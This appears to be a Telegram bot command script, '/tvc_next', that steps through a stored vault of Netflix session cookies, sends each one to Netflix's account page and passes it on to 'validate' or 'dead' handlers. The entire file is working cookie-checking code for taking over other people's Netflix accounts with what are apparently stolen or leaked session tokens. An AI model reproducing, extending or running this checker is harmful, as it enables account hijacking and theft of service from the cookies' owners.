/*CMD
  command: /tvc_next
  help: 
  need_reply: false
  auto_retry_time: 
  folder: USER

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
  group: 
CMD*/

var vault = Bot.getProp("vault") || [];
var idx = User.getProp("tvc_idx") || 0;
var max = User.getProp("tvc_max") || 50;
if (idx >= max || !vault.length) {
  var r0 = Api.sendMessage({
    chat_id: chat.chatid,
    text: "❌ All cookies failed.",
    parse_mode: "HTML",
    reply_markup: { inline_keyboard: [[{ text: "← Back", callback_data: "/start" }]] }
  });
  if (r0 && r0.result) User.setProp("last_msg_id", r0.result.message_id);
  return;
}
var ck = String(vault[idx % vault.length]);
User.setProp("tvc_idx", idx + 1);
if (!/^NetflixId=[^\s;]+$/.test(ck)) return Bot.runCommand("/tvc_next");
var nf = ck.substring(10).trim();
if (!nf) return Bot.runCommand("/tvc_next");
User.setProp("tvc_ck", ck);
User.setProp("tvc_nf", nf);

HTTP.get({
  url: "https://www.netflix.com/YourAccount",
  headers: { "User-Agent": "Mozilla/5.0", "Cookie": "NetflixId=" + nf },
  success: "/tvc_validate",
  error: "/tvc_dead"
});
